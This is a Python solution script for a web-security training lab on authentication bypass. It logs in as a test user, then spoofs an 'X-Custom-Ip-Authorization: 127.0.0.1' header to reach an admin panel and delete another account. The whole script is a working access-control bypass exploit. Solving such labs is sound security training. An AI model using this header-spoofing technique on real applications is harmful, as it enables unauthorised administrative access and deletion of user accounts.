#################################################################
#
# Lab: Authentication bypass via information disclosure
#
# Hack Steps: 
#      1. Fetch the login page
#      2. Extract the session and the csrf token
#      3. Login as wiener
#      4. Extract the new session
#      5. Delete carlos from the admin panel bypassing access 
#         using a custom header
#
#################################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a5100f804f983038142f7cc004e0071.web-security-academy.net"

def main():
    print("⦗1⦘ Fetching the login page.. ", end="", flush=True)
    
    login_page =fetch("/login")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Getting session and csrf token.. ", end="", flush=True)

    session = login_page.cookies.get("session")  
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Logging in as wiener.. ", end="", flush=True)

    data = { "username": "wiener", "password": "peter", "csrf": csrf_token }
    cookies = { "session": session }
    login_as_wiener = post_data("/login", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Getting a new session as wiener.. ", end="", flush=True)
    
    new_session = login_as_wiener.cookies.get("session")  
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Deleting carlos from the admin panel bypassing access using a custom header.. ", end="", flush=True)
    
    cookies = { "session": new_session }
    headers = { "X-Custom-Ip-Authorization": "127.0.0.1" }

    fetch("/admin/delete?username=carlos", cookies, headers) 

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cookies = None, headers = None):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, headers=headers)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()